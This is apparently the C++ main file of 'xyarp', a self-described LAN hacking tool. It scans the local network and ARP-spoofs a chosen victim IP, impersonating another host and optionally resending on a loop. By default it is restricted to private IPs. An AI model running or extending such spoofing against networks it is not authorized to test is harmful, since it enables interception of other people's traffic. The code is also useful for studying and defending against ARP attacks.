#include <stdio.h>
#include <iostream>
#include <thread>

#include <signal.h>

#include "xyarp.h"

void print_version();

_init init = _init();

/*
struct dec {
    _init * init;
    dec(_init * init):init(init){}
    ~dec(){
        delete init;
    }
} _dec(init);
*/

//auto init = std::unique_ptr<_init> (new _init());

int main(int argc, char *argv[]){
    auto parser = init.getParser();
    auto devices = init.getDevices();
    parser.parse_check(argc, argv);
    if(argc == 1 || parser.exist("help")){
        print_version();
        std::cerr << init.getParser().usage() << std::endl;
        return 0;
    }
    if(parser.exist("version")){
        print_version();
        return 0;
    }else if(parser.exist("list-devices")){
        for(auto &d : init.getDevices()){
            printf("%s\n", d.first.c_str());
        }
        return 0;
    }else if(parser.exist("list-libraries")){
        printf("System:\n\t%s\n", init.getSystem().c_str());
        printf("Libraries:\n");
        printf("\tlibpcap: %s\n", pcap_lib_version());
        printf("\tlibnet: %s\n", libnet_version());
        return 0;
    }else{
        auto dev_s = parser.get<std::string>("interface");
        if(dev_s.empty()){
            eprintf("Error: interface must be set\n");
            return 1;
        }
        pcap_if_t * dev = NULL;
        {
            auto it = devices.find(dev_s);
            if(it == devices.end()){
                eprintf("Error: device %s not found\n", dev_s.c_str());
                return 1;
            }else{
                dev = it->second;
            }
            std::thread t(xyarp_listen_arp, dev, &init);
            t.detach();
        }
        if(parser.exist("scan")){
            xyarp_scan_interface(dev);
        }else{
            auto victim = parser.get<std::string>("victim-ip");
            auto attacker = parser.get<std::string>("attacker-ip");
            #ifndef XYARP_PUBLIC_IP
            if(!XYTOOLS::ip_check_private(victim.c_str())){
                eprintf("Error: You cannot attack no-private IP using this version of xyarp!\n");
                eprintf("Error: You can attack public IP compiled with argument '-DXYARP_PUBLIC_IP'.\n");
                return 1;
            }
            #endif
            if(victim.empty() || attacker.empty()){
                eprintf("Error: victim-ip and attacker-ip must be set\n");
                return 1;
            }
            xyarp_disguise_arp(dev, victim.c_str(), attacker.c_str(), &init);
            if(parser.exist("repeat")){
                auto repeat = parser.get<int>("repeat");
                auto errors = -3;
                while(errors < 0){
                    errors += xyarp_disguise_arp(dev, victim.c_str(), attacker.c_str(), &init);
                    sleep(repeat);
                }
                if(errors > 0){
                    eprintf("Error: Too many errors\n");
                    return 1;
                }
            }
        }
    }
    return 0;
}

void print_version(){
    printf("A simple C++ LAN hacking tool\n");
    printf("xyarp version: %s\n", xynet_version());
}

_init::_init(){
    pcap_if_t *allDev;
    char errbuf[PCAP_ERRBUF_SIZE];
    int st = pcap_findalldevs(&allDev, errbuf);
    if(st){
        printf("Error: %s\n", errbuf);
        exit(1);
    }
    for (pcap_if_t *d = allDev; d ; d = d->next)
    {
        devices[d->name] = d;
    }
    struct utsname uts;
    if(uname(&uts) == 0){
        system += uts.version;
    }else{
        system += "Unknown";
    }
    a = new cmdline::parser();
    a->set_program_name("xyarp");
    a->add("version", 0, "Print version.");
    a->add("list-devices", 0, "List all network devices.");
    a->add("list-libraries", 0, "List all libraries.");
    a->add("scan", 's', "Scan other machines on the network.");
    a->add<std::string>("interface", 'i', "interface to use", false, "");
    a->add<int>("repeat", 'r', "Resends the packet continuously with a delay given in seconds by the argument. A delay of zero means only one packet is sent.", false, 0, cmdline::range(0, 1000));
    a->add<std::string>("victim-ip", 'v', "Choose a machine on the network to be attacked.", false, "");
    a->add<std::string>("attacker-ip",'a', "Choose another machine (other than the one running this program) as the one to be disguised.", false, "");
    a->add<std::string>("defender", 'd', "Start internal defender to protect this machine.(log|active)", false, "none");
}

_init::~_init(){
    //printf("Cleaning up init...\n");
    pcap_freealldevs(this->getDevices().begin()->second);
}